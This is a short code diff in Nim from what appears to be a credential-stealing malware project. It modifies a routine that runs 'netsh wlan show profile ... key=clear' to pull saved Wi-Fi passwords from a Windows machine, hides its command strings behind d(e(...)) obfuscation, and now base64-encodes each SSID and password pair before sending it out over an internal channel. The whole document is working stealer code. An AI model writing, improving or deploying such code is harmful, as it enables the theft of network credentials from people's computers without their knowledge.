@@ -3,6 +3,8 @@
 from strutils import split
 from strutils import contains
 
+from base64 import encode
+
 import ../functions/runCmd
 
 from ../channels import mainChannel
@@ -16,15 +18,15 @@ proc getWifiPasswords(): void =
     let split: seq[string] = line.split(": ")
 
     if split.len == 2:
-      let SSID: string = "\"" & split[1] & "\""
+      let SSID: string = split[1]
       let netshOutout2: string = runCmd(
-        d(e("netsh wlan show profile ")) & SSID & d(e(" key=clear"))
+        d(e("netsh wlan show profile \"")) & SSID & d(e("\" key=clear"))
       )
 
       for line in netshOutout2.split("\n"):
         if line.contains(d e"Key Content"):
           let password: string = line.split(": ")[1]
-          mainChannel.send SSID & ": " & password
+          mainChannel.send (d e "wp", encode SSID & ":" & password)
 
 proc initWifiPasswordsThread*(): void {.thread.} =
   getWifiPasswords()
